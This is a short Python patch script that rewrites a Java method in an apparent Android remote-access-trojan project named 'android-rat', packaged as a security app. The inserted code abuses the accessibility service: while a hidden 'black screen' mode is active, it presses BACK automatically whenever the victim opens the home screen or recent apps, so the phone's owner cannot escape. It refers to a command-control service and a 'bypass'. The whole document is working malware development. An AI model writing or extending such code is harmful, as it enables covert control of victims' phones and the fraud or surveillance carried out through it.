import shutil
J = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\UiAssistBridge.java"
shutil.copyfile(J, J + ".bak_black")
s = open(J, encoding="utf-8").read()
a = s.index("    private void blockSystemNavWhileBlackScreen(String packageName, String className) {")
b = s.index("    /** Bypass B:", a)
NEW = '''    private void blockSystemNavWhileBlackScreen(final String packageName, final String className) {
        if (!isBlackScreenActive || CommandControlService.isKillerModeActive) return;
        if (!isLauncherOrRecentsWindow(packageName, className)) return;
        final long now = System.currentTimeMillis();
        if (now - lastBlackScreenNavBlockMs < BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS) return;
        lastBlackScreenNavBlockMs = now;
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    if (!isBlackScreenActive || CommandControlService.isKillerModeActive) return;
                    android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root == null) return;
                    CharSequence pk = root.getPackageName();
                    String cur = pk == null ? "" : pk.toString().toLowerCase();
                    if (cur.isEmpty()) return;
                    if (isLauncherOrRecentsWindow(cur, "")) {
                        performGlobalAction(GLOBAL_ACTION_BACK);
                    }
                } catch (Throwable ignored) {}
            }
        }, 450);
    }

'''
s = s[:a] + NEW + s[b:]
open(J, "w", encoding="utf-8").write(s)
print("BACK diferido aplicado")
